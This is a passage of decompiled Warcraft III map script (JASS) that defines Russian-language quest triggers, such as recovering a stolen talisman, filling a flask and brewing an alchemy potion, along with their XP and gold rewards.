call AddSpecialEffectTargetUnitBJ("overhead",KW,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[10]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ZD)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Наглый вор\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 19-23|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Наглый вор.","|c006969FFУровень задания: 19-23|r
Арена - замечательная штука. Там можно померяться силами с кем захочешь. Но бывать настолько гнилые враги, которые идут на откровенную дерзость. В последнем поединке ублюдок Разрушитель украл мой талисман и скрылся в Терассе Творцов. Найдите его и верните мне мою драгоценность","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[10]=GetLastCreatedQuestBJ()
call AddSpecialEffectTargetUnitBJ("overhead",Ih,"war3mapImported\\QuestYellow0.mdx")
set Us[11]=GetLastCreatedEffectBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000019|r уровня",.027,255,255,255)
endif
endfunction
function BFy takes nothing returns nothing
set ZC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZC,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZC,Condition(function BFv))
call TriggerAddAction(ZC,function BFx)
endfunction
function BFz takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4E706C68) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BF0 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=19) then
return false
endif
return true
endfunction
function BF1 takes nothing returns nothing
if BF0() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[11])
call AddSpecialEffectTargetUnitBJ("overhead",Ih,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[11]=GetLastCreatedEffectBJ()
call EnableTrigger(ZE)
call DisableTrigger(GetTriggeringTrigger())
set YV[27]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($49303056,YV[27])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Сделка\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 19-23|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Сделка","|c006969FFУровень задания: 19-23|r
Ха-ха, жалкое подобие Героев??? Талисман? Он мой! Мечник недосмотрел, сам виноват. Но предлагаю сделку. Вы розберетесь с моим врагом и я отдам безделушку. Согласны? Хотя выбор у вас немного. Зарядите это Кольцо для вызова противника на поединок! Для начала отнесите его к башне драконов, которая находится в самом начале локации.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[11]=GetLastCreatedQuestBJ()
call RemoveLocation(YV[27])
else
call ne(GetTriggerUnit(),"Задание с |c00ff000019|r уровня",.027,255,255,255)
endif
endfunction
function BF2 takes nothing returns nothing
set ZD=CreateTrigger()
call DisableTrigger(ZD)
call TriggerRegisterAnyUnitEventBJ(ZD,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZD,Condition(function BFz))
call TriggerAddAction(ZD,function BF1)
endfunction
function BF3 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303056))==true) then
return false
endif
return true
endfunction
function BF4 takes nothing returns nothing
call EnableTrigger(ZF)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT," |c00FFFFFFДальше к статуи, которая находится на огненной земле!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303056))
call UnitAddItemByIdSwapped($49303055,GetEnteringUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetEnteringUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
endfunction
function BF5 takes nothing returns nothing
set ZE=CreateTrigger()
call DisableTrigger(ZE)
call TriggerRegisterEnterRectSimple(ZE,g)
call TriggerAddCondition(ZE,Condition(function BF3))
call TriggerAddAction(ZE,function BF4)
endfunction
function BF6 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303055))==true) then
return false
endif
return true
endfunction
function BF7 takes nothing returns nothing
call EnableTrigger(ZG)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT," |c00FFFFFFИщите последнюю статую!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303055))
call UnitAddItemByIdSwapped($49303057,GetEnteringUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetEnteringUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
endfunction
function BF8 takes nothing returns nothing
set ZF=CreateTrigger()
call DisableTrigger(ZF)
call TriggerRegisterEnterRectSimple(ZF,f)
call TriggerAddCondition(ZF,Condition(function BF6))
call TriggerAddAction(ZF,function BF7)
endfunction
function BF9 takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303057))==true) then
return false
endif
return true
endfunction
function BGB takes nothing returns nothing
call EnableTrigger(ZH)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT," |c00FFFFFFКольцо заряжено, отнестите его на поляну папоротника для встречи с монстром!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303057))
call UnitAddItemByIdSwapped($49303058,GetEnteringUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetEnteringUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
endfunction
function BGC takes nothing returns nothing
set ZG=CreateTrigger()
call DisableTrigger(ZG)
call TriggerRegisterEnterRectSimple(ZG,e)
call TriggerAddCondition(ZG,Condition(function BF9))
call TriggerAddAction(ZG,function BGB)
endfunction
function BGD takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303058))==true) then
return false
endif
return true
endfunction
function BGE takes nothing returns nothing
call EnableTrigger(ZI)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT," |c00FFFFFFГотовы к Битве????|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303058))
call ShowUnitShow(LY)
call PauseUnitBJ(false,LY)
endfunction
function BGF takes nothing returns nothing
set ZH=CreateTrigger()
call DisableTrigger(ZH)
call TriggerRegisterEnterRectSimple(ZH,h)
call TriggerAddCondition(ZH,Condition(function BGD))
call TriggerAddAction(ZH,function BGE)
endfunction
function BGG takes nothing returns boolean
if not (GetDyingUnit()==LY) then
return false
endif
return true
endfunction
function BGH takes nothing returns nothing
call DestroyEffectBJ(Us[11])
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ZJ)
call AddSpecialEffectTargetUnitBJ("overhead",Ih,"war3mapImported\\QuestYellow1.mdx")
set Us[11]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Враг Разрушителя пал|r")
endfunction
function BGI takes nothing returns nothing
set ZI=CreateTrigger()
call DisableTrigger(ZI)
call TriggerRegisterAnyUnitEventBJ(ZI,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ZI,Condition(function BGG))
call TriggerAddAction(ZI,function BGH)
endfunction
function BGJ takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4E706C68) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BGK takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=19) then
return false
endif
return true
endfunction
function BGL takes nothing returns nothing
if BGK() then
call DestroyEffectBJ(Us[11])
call DestroyEffectBJ(Us[10])
call AddSpecialEffectTargetUnitBJ("overhead",KW,"war3mapImported\\QuestYellow1.mdx")
set Us[10]=GetLastCreatedEffectBJ()
call EnableTrigger(ZK)
call DisableTrigger(GetTriggeringTrigger())
set YV[27]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($49303059,YV[27])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|cffffcc00Задание выполнено:|r \"Сделка\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Молодцы! ��ержите этот жалкий талисманчик...")
call QuestSetCompletedBJ(YX[11],true)
call DestroyQuest(YX[11])
call RemoveLocation(YV[27])
else
call ne(GetTriggerUnit(),"Задание с |c00ff000019|r уровня",.027,255,255,255)
endif
endfunction
function BGM takes nothing returns nothing
set ZJ=CreateTrigger()
call DisableTrigger(ZJ)
call TriggerRegisterAnyUnitEventBJ(ZJ,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZJ,Condition(function BGJ))
call TriggerAddAction(ZJ,function BGL)
endfunction
function BGN takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303059))==true) then
return false
endif
return true
endfunction
function BGO takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BGP takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BGQ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BGR takes nothing returns boolean
return GetBooleanAnd(BGP(),BGQ())
endfunction
function BGS takes nothing returns boolean
return GetBooleanAnd(BGO(),BGR())
endfunction
function BGT takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=19) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=23) then
return false
endif
return true
endfunction
function BGU takes nothing returns nothing
if BGT() then
call AddHeroXP(GetEnumUnit(),3500,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2400
else
endif
endfunction
function BGV takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=19) then
return false
endif
return true
endfunction
function BGW takes nothing returns nothing
call DestroyEffectBJ(Us[10])
call DisableTrigger(GetTriggeringTrigger())
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303059))
call QuestSetCompletedBJ(YX[10],true)
call DestroyQuest(YX[10])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BGS))
call ForGroupBJ(Th,function BGU)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2400 опыта|r, |c00ffff00250 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BGV() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+750
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BGX takes nothing returns nothing
set ZK=CreateTrigger()
call DisableTrigger(ZK)
call TriggerRegisterEnterRectSimple(ZK,d)
call TriggerAddCondition(ZK,Condition(function BGN))
call TriggerAddAction(ZK,function BGW)
endfunction
function BGY takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68777433) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BGZ takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=22) then
return false
endif
return true
endfunction
function BGa takes nothing returns nothing
if BGZ() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[12])
call AddSpecialEffectTargetUnitBJ("overhead",Ic,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[12]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(ZM)
set YV[28]=GetRectCenter(m)
call CreateItemLoc($4930305A,YV[28])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Очищение\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 22-26|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Очищение","Я очень люблю воду! По мне видно, да? Но я никогда не пробовал на вкус воду с ручья Тропиков. Принесите мне немного этой воды, и я Вас щедро вознагражу
|c006969FFУровень з�","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[12]=GetLastCreatedQuestBJ()
call RemoveLocation(YV[28])
else
call ne(GetTriggerUnit(),"Задание с |c00ff000022|r уровня",.027,255,255,255)
endif
endfunction
function BGb takes nothing returns nothing
set ZL=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZL,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZL,Condition(function BGY))
call TriggerAddAction(ZL,function BGa)
endfunction
function BGc takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930305A))==true) then
return false
endif
return true
endfunction
function BGd takes nothing returns nothing
call EnableTrigger(ZN)
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT," |c001CE6B9Колба наполнена, вернитесь к Элементалю!|r")
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$4930305A))
call UnitAddItemByIdSwapped($49303130,GetEnteringUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetEnteringUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
endfunction
function BGe takes nothing returns nothing
set ZM=CreateTrigger()
call DisableTrigger(ZM)
call TriggerRegisterEnterRectSimple(ZM,n)
call TriggerAddCondition(ZM,Condition(function BGc))
call TriggerAddAction(ZM,function BGd)
endfunction
function BGf takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303130))==true) then
return false
endif
return true
endfunction
function BGg takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BGh takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BGi takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BGj takes nothing returns boolean
return GetBooleanAnd(BGh(),BGi())
endfunction
function BGk takes nothing returns boolean
return GetBooleanAnd(BGg(),BGj())
endfunction
function BGl takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=22) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=26) then
return false
endif
return true
endfunction
function BGm takes nothing returns nothing
if BGl() then
call AddHeroXP(GetEnumUnit(),2000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2000
else
endif
endfunction
function BGn takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=25) then
return false
endif
return true
endfunction
function BGo takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[12])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303130))
call QuestSetCompletedBJ(YX[12],true)
call DestroyQuest(YX[12])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BGk))
call ForGroupBJ(Th,function BGm)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2000 опыта|r, |c00ffff00200 золота|r, |c00ff96965 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BGn() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+600
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+15
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BGp takes nothing returns nothing
set ZN=CreateTrigger()
call DisableTrigger(ZN)
call TriggerRegisterEnterRectSimple(ZN,m)
call TriggerAddCondition(ZN,Condition(function BGf))
call TriggerAddAction(ZN,function BGo)
endfunction
function BGq takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68737074) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BGr takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=22) then
return false
endif
return true
endfunction
function BGs takes nothing returns nothing
if BGr() then
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[13])
call AddSpecialEffectTargetUnitBJ("overhead",Ij,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[13]=GetLastCreatedEffectBJ()
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Проверка Духа \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 22-28|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Проверка Духа","Герои? Сильные? Ну что ж, проверим... Убейте |c00FF0000Ксерона|r, главу драконов, посмотрим, на что Вы способны.
|c006969FFУровень задания: 23-28|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[13]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000022|r уровня",.027,255,255,255)
endif
endfunction
function BGt takes nothing returns nothing
set ZO=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZO,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZO,Condition(function BGq))
call TriggerAddAction(ZO,function BGs)
endfunction
function BGu takes nothing returns nothing
call DestroyEffectBJ(Us[13])
call DisableTrigger(ZO)
call EnableTrigger(ZQ)
call AddSpecialEffectTargetUnitBJ("overhead",Ij,"war3mapImported\\QuestYellow1.mdx")
set Us[13]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Ксерон убит! Вернитесь к Ведьмаку за наградой|r")
endfunction
function BGv takes nothing returns nothing
set ZP=CreateTrigger()
call TriggerRegisterUnitEvent(ZP,K5,EVENT_UNIT_DEATH)
call TriggerAddAction(ZP,function BGu)
endfunction
function BGw takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$68737074) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BGx takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BGy takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BGz takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BG0 takes nothing returns boolean
return GetBooleanAnd(BGy(),BGz())
endfunction
function BG1 takes nothing returns boolean
return GetBooleanAnd(BGx(),BG0())
endfunction
function BG2 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=22) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=28) then
return false
endif
return true
endfunction
function BG3 takes nothing returns nothing
if BG2() then
call AddHeroXP(GetEnumUnit(),4500,false)
else
endif
endfunction
function BG4 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=23) then
return false
endif
return true
endfunction
function BG5 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=22) then
return false
endif
return true
endfunction
function BG6 takes nothing returns nothing
if BG5() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call QuestSetCompletedBJ(YX[13],true)
call DestroyQuest(YX[13])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BG1))
call ForGroupBJ(Th,function BG3)
call DestroyGroup(Th)
set Sf=Sf+1
call DestroyEffectBJ(Us[13])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00300 золота|r, |c00ff969610 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BG4() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000022|r уровня",.027,255,255,255)
endif
endfunction
function BG7 takes nothing returns nothing
set ZQ=CreateTrigger()
call DisableTrigger(ZQ)
call TriggerRegisterAnyUnitEventBJ(ZQ,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZQ,Condition(function BGw))
call TriggerAddAction(ZQ,function BG6)
endfunction
function BG8 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$65303037) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BG9 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=22) then
return false
endif
return true
endfunction
function BHB takes nothing returns nothing
if BG9() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(ZS)
call EnableTrigger(ZT)
call EnableTrigger(ZU)
set YV[28]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($49303137,YV[28])
call DestroyEffectBJ(Us[14])
call AddSpecialEffectTargetUnitBJ("overhead",Il,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[14]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Алхимия \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 22-26|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Алхимия","|c006969FFУровень задания: 22-26|r
Здраствуйте, дорогие путники. Все мы знаем, что в мире есть добро и зло, верно. Но я где-то посередине. Если Вас убьют, я не помчусь мстить, но и ваша смерть будет тоже мне неприятна. Так вот, дабы немного уравновесить эти \"весы\", я придумал некое зелье, которое поможет мне менять характер любого живого существа, но не хватает кое-чего. Возьмите эту бутылку с наполните её 5-ю семенами природы, котрые иногда падают при смерти энтов в джунглях. После приходите ко мне","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[14]=GetLastCreatedQuestBJ()
call RemoveLocation(YV[28])
else
call ne(GetTriggerUnit(),"Задание с |c00ff000022|r уровня",.027,255,255,255)
endif
endfunction
function BHC takes nothing returns nothing
set ZR=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZR,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZR,Condition(function BG8))
call TriggerAddAction(ZR,function BHB)
endfunction
function BHD takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$65303036) then
return false
endif
return true
endfunction
function BHE takes nothing returns boolean
if not (QP[3]<=1) then
return false
endif
return true
endfunction
function BHF takes nothing returns nothing
set ZV[1]=GetUnitLoc(GetDyingUnit())
set QP[3]=GetRandomInt(1,2)
if BHE() then
call CreateItemLoc($49303131,ZV[1])
else
endif
call RemoveLocation(ZV[1])
endfunction
function BHG takes nothing returns nothing
set ZS=CreateTrigger()
call DisableTrigger(ZS)
call TriggerRegisterAnyUnitEventBJ(ZS,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ZS,Condition(function BHD))
call TriggerAddAction(ZS,function BHF)
endfunction
function BHH takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303137)==true) then
return false
endif
return true
endfunction
function BHI takes nothing returns boolean
if not BHH() then
return false
endif
return true
endfunction
function BHJ takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303131) then
return false
endif
return true
endfunction
function BHK takes nothing returns boolean
if not BHJ() then
return false
endif
return true
endfunction
function BHL takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303132)==true) then
return false
endif
return true
endfunction
function BHM takes nothing returns boolean
if not BHL() then
return false
endif
return true
endfunction
function BHN takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303131) then
return false
endif
return true
endfunction
function BHO takes nothing returns boolean
if not BHN() then
return false
endif
return true
endfunction
function BHP takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303133)==true) then
return false
endif
return true
endfunction
function BHQ takes nothing returns boolean
if not BHP() then
return false
endif
return true
endfunction
function BHR takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303131) then
return false
endif
return true
endfunction
function BHS takes nothing returns boolean
if not BHR() then
return false
endif
return true
endfunction
function BHT takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303134)==true) then
return false
endif
return true
endfunction
function BHU takes nothing returns boolean
if not BHT() then
return false
endif
return true
endfunction
function BHV takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303131) then
return false
endif
return true
endfunction
function BHW takes nothing returns boolean
if not BHV() then
return false
endif
return true
endfunction
function BHX takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303135)==true) then
return false
endif
return true
endfunction
function BHY takes nothing returns boolean
if not BHX() then
return false
endif
return true
endfunction
function BHZ takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303131) then
return false
endif
return true
endfunction
function BHa takes nothing returns boolean
if not BHZ() then
return false
endif
return true
endfunction
function BHb takes nothing returns nothing
if BHK() then
if BHI() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303137))
call UnitAddItemByIdSwapped($49303132,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHO() then
if BHM() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303132))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303133,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHS() then
if BHQ() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303133))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303134,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHW() then
if BHU() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303134))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303135,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
